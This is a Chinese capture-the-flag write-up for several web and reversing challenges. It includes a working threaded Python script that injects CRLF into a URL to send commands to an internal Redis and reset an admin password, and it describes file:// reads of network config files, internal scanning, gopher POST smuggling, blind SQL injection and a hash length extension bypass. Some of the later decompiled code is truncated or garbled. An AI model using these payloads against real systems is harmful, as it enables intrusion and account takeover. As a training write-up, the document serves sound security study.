这个题是利用了Python urllib HTTP头注入向然后造成ssrf，操作redis可以更改管理员账号密码，然后登录。但是提示fast fast
fast。
其实是后台有个脚本在一直修改账号密码，所以导致登录不成功，所以需要多线程去操作redis修改账号面膜然后登录。(这里有脑洞，已吊打出题人）
脚本实现
    import requests
    import threading
    def test():
        while True:
            try:
                url = "http://web7.08067.me/web7/input"
                data = {'value': 'http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/foo'}
                requests.post(url, data=data)
            except Exception, e:
                pass
    def test2():
        while True:
            try:
                url = "http://web7.08067.me/web7/admin"
                data = {'passworld': 'xx00'}
                text = requests.post(url, data=data).text
                if 'flag' in text:
                    print text
            except:
                pass
    list = []
    for i in range(10):
        t = threading.Thread(target=test)
        t.setDaemon(True)
        t.start()
        list.append(t)
    for i in range(10):
        t = threading.Thread(target=test2)
        t.setDaemon(True)
        t.start()
        list.append(t)
    for i in list:
        i.join()
**web 300**
* * *
这个题一看界面，就想到时ssrf
经过测试，可以直接发起请求，也没有任何的内网地址过滤。然后就是寻找内网段。
这里就是利用file://协议去读本机的网卡。
centos的网卡地址/etc/sysconfig/network-scripts/ifcfg-eth0。
然后得到这台主机 所处的内网的网段是在172.16.181.0/24段。
然后探测下C段，发现只有172.16.181.166主机的80 存在一个应用。
尝试扫一波目录，发现了一个常规目录admin/login.php,访问之，发现一个登陆表单
不过，这里的method是POST
既然是POST，自然就想到了利用gopher协议构造POST包。这里开始 就需要特别细心了。
大概有以下几点：
1.这里的表单action是wllmctf_login.php而不是login.php,很多师傅就是这里被坑了一波。
2.gopher发包一定要填写端口，因他不像http默认走80端口。
3.注意post包里面的Content-Length的长度一定要和post的内容长度相符合，很多师傅这个地方都忘记了，导致被坑了很久
4.记得加上Content-Type: application/x-www-form-urlencoded，然后记得是两次url编码
大概的构造好之后的poc如下图，
可以看到，这里用户名错误会报error names，如果密码错误回返回password error。
很容易测出来这个这个地方有注入，什么都没有过滤，是bool盲注，所以只接就能写脚本跑用户名密码。
最后得到用户名是admin，跑出的密码MD5解密之后是xiaozhang123.
最后填入正确用户名和密码。得到flag
这个题不难，贵在一定要细心啊
**web 400**
* * *
这是一道代码审计的题，访问 /web.zip 就拿到了源码，
我们在 riji.php 这里发现了
由于是伪全局 机制，我们这里可以发现一个变量覆盖，只要在登陆后，让查询用户不存在就可以了，
下面漏洞触发点为
再看 api.php, 我们这里看见了 del_user 操作，只要删除了用户，我们就可以触发上面的变量覆盖漏洞了，
权限确认这里，一看这种校验方式 就会发现存在 hash扩展攻击，然后我们需要找到 admin 的key 的一个密文就可以构造密文，绕过权限验证了，
Forget.php 找回密码处
我们发现了可以获取任意用户key的md5加密的密文，这里hash扩展攻击的条件已经满足
我们再来继续看看 api.php
这里我们就需要找到当前用户的id才能删除我们的用户，
/index.php 就会将 userid 写入到 cookie 中，删除条件就满足了
所以整体逻辑就是，先登录用户，抓取 userid ，然后找回 管理员(admin) 的密码
然后 通过api.php 接口删除用户，我们用登陆后的用户访问 riji.php ，传入 id 参数
就可以了，这里没有任何过滤，直接联合查询，就查到了flag
**CM50**
* * *
第一眼看题。 好直接上工具！ eXeScope
哒~哒 就在这里！
**  
**
**CM100**
* * *
[http://misc.08067.me/CM5100/](http://misc.08067.me/CM50/)
直接丢IDA 然后搜字符窜。Wrong~ 找到关键函数。仔细看看其实算法很简单只是其余处理稍微复杂。其实就是一步异或操作。寻找到常量 26544631 和
12345678 进行异或。
Flag出来了
Flag{lr{-l0F-)uFe?}
**CM150**
* * *
[http://misc.08067.me/CM150/](http://misc.08067.me/CM50/)
Apk逆向出题人不太会，直接贴源码吧！
    encode = Encode1(Flag,Flag.length());
              encode1 = Encode2(encode,Flag);
              flag = check(encode1);
                  if (flag==1)
                    {
                     Toast.makeText(MainActivity.this, "WOw~, You got it !", Toast.LENGTH_SHORT).show();
                      }
                     else
                     {
                      Toast.makeText(MainActivity.this, "trg again~", Toast.LENGTH_SHORT).show();
两个加密函数，一个检查函数，进去
    public String Encode1(String Flag , int len)
    {
    char [] xor = Flag.toCharArray();
    int key = 29; 
    int temp;
    int [] encode = new int [16];
    if (len == 16)
    {
    for (int i = 0;i=9)
    {
    if (i < 12)
    Flag[i] -= 50;
    else
    Flag[i] -= 9;
    }
    }
    }
    void Encode2(unsigned char *decrypt, unsigned char * Flag)
    {
    for (int i = 0; i < 16; i++)
    {
    Flag[i] ^= 29;
    if (i%2 != 0)
    {
    Swap(&Flag[i-1],&Flag[i]);
    }
    }
    Encode1(decrypt, Flag);
    }
    void Swap(unsigned char *p1, unsigned char *p2)
    {
    char temp;
    temp = *p1;
    *p1 = *p2;
    *p2 = temp;
    }
    int Decode(unsigned char * Flag)
    {
    int i = Flag[0] - 199 + Flag[1] - 171 + Flag[2] - 93 + Flag[3] - 153 + Flag[4] - 6 + Flag[5] - 38 + Flag[6] - 127 + Flag[7] - 76 + Flag[8] - 79 + Flag[9] - 177 + Flag[10] - 67 + Flag[11] - 29 + Flag[12] - 122 + Flag[13] - 144 + Flag[14] - 135 + Flag[15] - 230 - 15;
    return i;
    }